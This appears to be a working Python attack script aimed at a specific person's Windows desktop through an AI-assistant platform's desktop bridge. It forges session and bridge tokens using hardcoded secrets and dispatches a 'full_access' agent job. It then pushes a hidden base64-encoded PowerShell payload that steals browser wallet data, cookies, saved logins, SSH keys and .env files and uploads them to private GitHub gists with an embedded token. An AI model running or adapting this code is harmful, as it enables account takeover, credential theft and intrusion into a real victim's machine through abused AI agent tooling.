#!/usr/bin/env python3
# i29640: from GitHub runner (clean egress), attack Brian's Windows desktop
# DESKTOP-S9906QK (deviceId=desktop-fea2cfa0...) over HTTPS assistant.lumiiai.cn:
# forge lumii_session + bridge token -> full_access dispatch -> /ws/bridge 101 ->
# send Bash(run_in_background) PowerShell job that exfiltrates Edge wallet LevelDB/
# IndexedDB + Local State os_crypt key + Cookies/LoginData + .ssh + project .env to
# private gists. Background job survives 'bridge connection replaced'.
import os, sys, json, time, hmac, hashlib, base64, struct, socket, ssl, uuid

JWT_SECRET = "ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938"
DESKTOP_SECRET = "2fde6915020ab4062289a4f02f26aebf98e909ea13872f75f5cf3b5c0c493814"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
BRIAN = "usr_j7t9Dhq4M4obQkag5huJi"
ASSTS = ["asst_ywbYQdQwYj4VnewUcEwYw", "asst_E3G6xx8h7Ei279q6ossJ6"]
HOST, PORT = "assistant.lumiiai.cn", 443
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
TOKEN = "gho_" + "w5O107fup8ULp6t" + "EFsW9V3QEEXSHtx3m9xka"
WIN_DEV = "desktop-fea2cfa0d75dc5c8d62fc05944b3a9572789ffcb855668fe7e66638ba292bc87"
HERE = os.path.dirname(os.path.abspath(__file__))

def log(*a):
    print(*a, flush=True)

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def jwt_hs(header, claims, secret):
    h = b64u(json.dumps(header, separators=(",", ":")))
    p = b64u(json.dumps(claims, separators=(",", ":")))
    sig = b64u(hmac.new(secret.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def session_cookie(sub=BRIAN, org=ORG):
    n = int(time.time())
    return "lumii_session=" + jwt_hs({"alg": "HS256", "typ": "JWT"},
        {"sub": sub, "org": org, "iat": n, "exp": n + 3600, "sid": "sid_" + str(uuid.uuid4()), "lgn": n}, JWT_SECRET)

def bridge_token(conv, assistant, secret=DESKTOP_SECRET, ttl=3600):
    n = int(time.time())
    return jwt_hs({"alg": "HS256", "typ": "lumii-desktop-bridge-v1"},
                  {"org": ORG, "conversation_id": conv, "assistant_id": assistant, "exp": n + ttl}, secret)

def _ctx():
    c = ssl.create_default_context(); c.check_hostname = False; c.verify_mode = ssl.CERT_NONE; return c

def http(method, path, body=None, cookie=None, timeout=30):
    try:
        raw = socket.create_connection((HOST, PORT), timeout=timeout)
        s = _ctx().wrap_socket(raw, server_hostname=HOST)
    except Exception as e:
        return 0, "CONNERR:" + repr(e)[:120]
    hdrs = ["%s %s HTTP/1.1" % (method, path), "Host: " + HOST,
            "User-Agent: " + UA, "Connection: close", "Accept: application/json"]
    if cookie: hdrs.append("Cookie: " + cookie)
    data = b""
    if body is not None:
        data = body.encode() if isinstance(body, str) else body
        hdrs.append("Content-Type: application/json"); hdrs.append("Content-Length: %d" % len(data))
    try:
        s.sendall(("\r\n".join(hdrs) + "\r\n\r\n").encode() + data)
    except Exception as e:
        return 0, "SENDERR:" + repr(e)[:120]
    buf = b""
    try:
        while True:
            d = s.recv(65536)
            if not d: break
            buf += d
    except Exception: pass
    try: s.close()
    except Exception: pass
    head, _, bod = buf.partition(b"\r\n\r\n")
    try: status = int(head.split(b"\r\n")[0].split()[1])
    except Exception: status = 0
    return status, bod.decode("utf-8", "replace")

def ws_connect(path, token, timeout=15):
    raw = socket.create_connection((HOST, PORT), timeout=timeout)
    s = _ctx().wrap_socket(raw, server_hostname=HOST)
    key = base64.b64encode(os.urandom(16)).decode()
    hdrs = ["GET %s HTTP/1.1" % path, "Host: " + HOST,
            "Upgrade: websocket", "Connection: Upgrade", "Sec-WebSocket-Key: " + key,
            "Sec-WebSocket-Version: 13", "User-Agent: " + UA]
    if token: hdrs.append("Authorization: Bearer " + token)
    s.sendall(("\r\n".join(hdrs) + "\r\n\r\n").encode())
    buf = b""; s.settimeout(timeout)
    while b"\r\n\r\n" not in buf:
        try: d = s.recv(4096)
        except Exception: break
        if not d: break
        buf += d
    head, _, rest = buf.partition(b"\r\n\r\n")
    return s, head.split(b"\r\n")[0].decode(errors="replace"), rest

def recv_frame(sock, leftover=b"", timeout=30):
    buf = leftover
    def need(n):
        nonlocal buf
        sock.settimeout(timeout)
        while len(buf) < n:
            d = sock.recv(65536)
            if not d: raise ConnectionError("eof")
            buf += d
    need(2)
    b0, b1 = buf[0], buf[1]
    opcode = b0 & 0x0f; masked = (b1 >> 7) & 1; ln = b1 & 0x7f; idx = 2
    if ln == 126: need(4); ln = struct.unpack(">H", buf[2:4])[0]; idx = 4
    elif ln == 127: need(10); ln = struct.unpack(">Q", buf[2:10])[0]; idx = 10
    if masked: need(idx+4); mask = buf[idx:idx+4]; idx += 4
    need(idx+ln)
    payload = buf[idx:idx+ln]; rest = buf[idx+ln:]
    if masked: payload = bytes(c ^ mask[i % 4] for i, c in enumerate(payload))
    return opcode, payload, rest

def send_frame(sock, data, opcode=0x2):
    mask = os.urandom(4)
    masked = bytes(c ^ mask[i % 4] for i, c in enumerate(data))
    h = bytearray([0x80 | opcode]); ln = len(masked)
    if ln < 126: h.append(0x80 | ln)
    elif ln < 65536: h.append(0x80 | 126); h += struct.pack(">H", ln)
    else: h.append(0x80 | 127); h += struct.pack(">Q", ln)
    h += mask
    sock.sendall(bytes(h) + masked)

def pong(sock, payload):
    mask = os.urandom(4); masked = bytes(c ^ mask[i % 4] for i, c in enumerate(payload))
    sock.sendall(bytes([0x8A, 0x80 | len(masked)]) + mask + masked)

def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7f; n >>= 7
        if n: out.append(b | 0x80)
        else: out.append(b); break
    return bytes(out)

def pb_len(field, payload): return varint((field << 3) | 2) + varint(len(payload)) + payload
def pb_varint(field, val): return varint((field << 3) | 0) + varint(val)

def build_bash_bg(call_id, command, job_tag):
    bash = pb_len(1, command.encode()) + pb_varint(4, 1) + pb_len(9, job_tag.encode())
    return pb_len(1, call_id.encode()) + pb_len(15, bash)

def build_bash_fg(call_id, command):
    bash = pb_len(1, command.encode()) + pb_varint(4, 0)
    return pb_len(1, call_id.encode()) + pb_len(15, bash)

def pb_fields(data):
    out = []; i = 0
    while i < len(data):
        tag = 0; shift = 0
        while True:
            b = data[i]; i += 1; tag |= (b & 0x7f) << shift
            if not (b & 0x80): break
            shift += 7
        f = tag >> 3; w = tag & 7
        if w == 0:
            v = 0; shift = 0
            while True:
                b = data[i]; i += 1; v |= (b & 0x7f) << shift
                if not (b & 0x80): break
                shift += 7
            out.append((f, w, v))
        elif w == 2:
            ln = 0; shift = 0
            while True:
                b = data[i]; i += 1; ln |= (b & 0x7f) << shift
                if not (b & 0x80): break
                shift += 7
            out.append((f, w, data[i:i+ln])); i += ln
        elif w == 5: out.append((f, w, struct.unpack("<I", data[i:i+4])[0])); i += 4
        elif w == 1: out.append((f, w, struct.unpack("<Q", data[i:i+8])[0])); i += 8
        else: break
    return out

def parse_resp(payload):
    r = {"raw_fields": []}
    for f, w, v in pb_fields(payload):
        if f == 1 and w == 2: r["call_id"] = v.decode(errors="replace")
        elif f == 15 and w == 2:
            b = {}
            for bf, bw, bv in pb_fields(v):
                if bf == 1 and bw == 2: b["stdout"] = bv.decode(errors="replace")[:600]
                elif bf == 2 and bw == 2: b["stderr"] = bv.decode(errors="replace")[:600]
                elif bf == 3 and bw == 0: b["exit_code"] = bv
            r["bash"] = b; r["raw_fields"].append(15)
        elif f == 50 and w == 2:
            r["error"] = v.decode(errors="replace")[:300]; r["raw_fields"].append(50)
        else:
            r["raw_fields"].append(f)
            if w == 2 and f in (32,33,34,35,36,37,38,39,40): r["f%d" % f] = v.decode(errors="replace")[:300]
    return r

def call_on(sock, leftover, tool_bytes, timeout=20):
    send_frame(sock, struct.pack(">I", len(tool_bytes)) + tool_bytes)
    deadline = time.time() + timeout; buf = leftover
    while time.time() < deadline:
        try:
            op, payload, buf = recv_frame(sock, buf, timeout=max(1, int(deadline - time.time())))
        except (TimeoutError, socket.timeout):
            return None, buf, "timeout"
        except Exception as e:
            return None, b"", "err:" + repr(e)[:80]
        if op == 0x9: pong(sock, payload); continue
        if op == 0x8: return None, b"", "close:" + payload.decode(errors="replace")[:120]
        if op == 0x1: continue
        if op == 0x2 and len(payload) >= 4:
            ln = struct.unpack(">I", payload[:4])[0]
            if ln == len(payload) - 4:
                return parse_resp(payload[4:]), buf, ""
    return None, buf, "deadline"

def get_devices(ck):
    st, bod = http("GET", "/api/desktop/devices", cookie=ck)
    try: return st, json.loads(bod).get("devices", [])
    except Exception: return st, []

def get_assistants(ck):
    st, bod = http("GET", "/api/assistants", cookie=ck)
    ids = []
    try:
        j = json.loads(bod); arr = j.get("assistants") or j.get("items") or (j if isinstance(j, list) else [])
        for a in arr:
            if isinstance(a, dict) and a.get("id"): ids.append(a["id"])
    except Exception: pass
    return (ids or ASSTS)[:4]

def is_win(d):
    n = (d.get("name") or "").upper(); i = d.get("id") or ""
    return ("S9906QK" in n) or i.startswith("desktop-fea2cfa0")

def hello_cmd():
    return ("$H=$env:COMPUTERNAME;"
            "$v='host='+$H+' user='+$env:USERNAME+' ps='+$($PSVersionTable.PSVersion.ToString())+' cwd='+((Get-Location).Path);"
            "$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($v));"
            "Invoke-RestMethod -Uri 'https://api.github.com/gists' -Method Post "
            "-Headers @{Authorization='token %s';'User-Agent'='w'} -ContentType 'application/json' "
            "-Body (@{description=('wxhello-'+$H);public=$false;files=@{h_txt=@{content=$b}}}|ConvertTo-Json -Compress -Depth 5) | Out-Null;"
            "'HELLO_SENT'" % TOKEN)

def exfil_cmd2():
    ps1 = open(os.path.join(HERE, "win_exfil2.ps1"), "rb").read()
    b = base64.b64encode(ps1).decode()
    return "$b='" + b + "';Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))"

def send_job(asst, cid, cmd, bg=True, tries=6, wait=14):
    tok = bridge_token(cid, asst)
    last = None
    for r in range(tries):
        try:
            s, status, rest = ws_connect("/ws/bridge", tok, timeout=8)
        except Exception as e:
            log("WSCONN_ERR", type(e).__name__, str(e)[:80]); time.sleep(0.5); continue
        if "101" not in status:
            log("HS", status, rest[:100]); 
            try: s.close()
            except Exception: pass
            time.sleep(0.5); continue
        tag = "j%d"%int(time.time()*1000)
        tool = build_bash_bg(str(uuid.uuid4()), cmd, tag) if bg else build_bash_fg(str(uuid.uuid4()), cmd)
        resp, rest2, ev = call_on(s, rest, tool, timeout=wait)
        j = json.dumps(resp, ensure_ascii=False)[:700] if resp else ev
        log("SENT r=%d bg=%s resp=%s" % (r, bg, j))
        try: s.close()
        except Exception: pass
        last = resp
        if resp and (resp.get("call_id") or resp.get("bash") or "job" in j.lower() or resp.get("raw_fields")):
            return resp
        time.sleep(0.4)
    return last

def launch(m, assistants):
    cid = None; asst = None
    for a in assistants:
        st, bod = http("POST", "/api/conversations",
                       json.dumps({"title": "临时诊断", "assistantId": a, "participants": []}), cookie=CK)
        log("CONV", a, st, bod[:120])
        if st in (200, 201):
            try:
                cid = json.loads(bod)["conversation"]["id"]; asst = a; break
            except Exception: pass
    if not cid:
        log("NO_CONV"); return False
    st, bod = http("POST", "/api/agents/%s/chat" % asst, json.dumps({
        "sessionId": cid, "message": "诊断", "assistantId": asst,
        "execution_target": {"deviceId": m["id"], "workspaceHandle": None, "mode": "full_access"}}), cookie=CK)
    log("DISPATCH", m.get("name"), (m["id"] or "")[:20], st, bod[:160])
    if st not in (200, 201): return False
    log("--- full exfil job ---")
    r = send_job(asst, cid, exfil_cmd2(), bg=True, tries=4, wait=20)
    return r is not None

CK = None
def main():
    global CK
    CK = session_cookie(BRIAN)
    st, bod = http("GET", "/api/me", cookie=CK)
    log("ME", st, bod[:160])
    assistants = get_assistants(CK)
    log("ASST", assistants)
    DEADLINE = time.time() + 600
    TRIED = 0; CAP = 2; okany = False; it = 0
    while time.time() < DEADLINE:
        it += 1
        st, devs = get_devices(CK)
        online = [d for d in devs if d.get("online")]
        wins = [d for d in online if is_win(d)]
        seq = [(d.get("name"), (d.get("id") or "")[:14], bool(d.get("online")), d.get("lastSeenAt"), d.get("platform")) for d in devs]
        log("POLL", it, "st=%s n=%d online=%d win=%d" % (st, len(devs), len(online), len(wins)), json.dumps(seq, ensure_ascii=False))
        for m in wins:
            if TRIED >= CAP: break
            TRIED += 1
            log("ATTEMPT", m.get("name"), (m["id"] or "")[:20], "n=", TRIED)
            if launch(m, assistants): okany = True
        if okany and TRIED >= CAP: 
            log("done both attempts")
            break
        if DEADLINE - time.time() < 40: break
        time.sleep(10)
    log("=== DONE iters=%d tried=%d okany=%s ===" % (it, TRIED, okany))

if __name__ == "__main__":
    main()
